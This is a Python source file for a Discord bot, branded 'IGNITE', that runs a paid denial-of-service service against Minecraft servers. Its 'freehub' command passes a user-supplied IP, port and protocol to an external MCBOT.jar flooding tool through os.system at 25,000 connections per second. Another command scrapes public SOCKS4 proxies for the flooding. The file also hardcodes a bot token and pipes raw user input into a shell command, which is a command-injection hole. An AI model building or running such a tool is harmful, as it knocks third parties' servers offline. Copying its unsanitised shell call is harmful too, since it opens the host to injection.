import requests
from discord import Embed, File
from discord.ext import commands
import os
import discord

token = "ODgwOTg4OTc0Mzc2Njg1NTc4.YSmS6w.1PQrlcnGn2ULshFQ_bTfxd85PS4"

client = commands.Bot(command_prefix=';')
client.remove_command('fhelp')

@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.errors.CheckFailure):
        error2 = embed = Embed(title=":fire: Error", description=f"Permission Denied !\n Please Purchase Plan", color=0xf50000)
        embed.set_footer(text="© IGNITE | :fire:")
        await ctx.channel.send(embed=error2)

@client.command()
async def help1248192481294812491284(ctx):
    embed = discord.Embed(title=f"Methods List", description=f"\n For Non-Premium Users (🐀 Guest) Please Use Commands Listed Below\n \n  ;FreeHub IP Port Protocol\n \n ;Update Updates Current Proxies\n ;Resolve Domain\n \n**Note** If Somone Else Is Using FreeHub,\n You Must Wait Before Current Attack To Finish. Then You Can Attack.\n Or You Can Simply Queue Attack,\nThis Means When Prevous Attack Stops,\n Your Attack Will Start Immediately.\n All FreeHub Attack Durations Are 30 Second.")     
    embed.set_footer(text="© IGNITE | 🔥")
    await ctx.send(embed=embed)

@client.command()
async def update(ctx):
    f = open("proxies.txt", "a+")
    f.truncate(0)
    r = requests.get('https://api.openproxylist.xyz/socks4.txt')
    proxies = []
    for proxy in r.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
            proxies.append(proxy)
    for p in proxies:
        f.write((p)+"\n")
    embed = discord.Embed(title=f"IGNITE | 🔥", description=f"Socks4 Proxies has been successfully refreshed.")     
    embed.set_footer(text="© IGNITE | 🔥")
    await ctx.send(embed=embed)


@client.command()
@commands.has_role('🐀 Guest')
async def freehub (ctx, arg1, arg2, arg3):
    embed = Embed(title="IGNITE | 🔥", color=0xaea9a3)
    embed = discord.Embed(title=f"IGNITE | 🔥", description=f"► Method: FreeHub :fire: \n \n  ► Attack started! \n  ► to {arg1}:{arg2}\n  ► for 30 seconds! \n  ► Author : {ctx.message.author}\n  ► CPS 25000")     
    embed.set_image(url=f'http://status.mclive.eu/Ignite/{arg1}/{arg2}/banner.png')
    embed.set_footer(text="© IGNITE | 🔥")
    await ctx.send(embed=embed)
    cmd = f"java -jar MCBOT.Jar {arg1}:{arg2} {arg3} join 60 25000"
    os.system(cmd) 
    
client.run(token)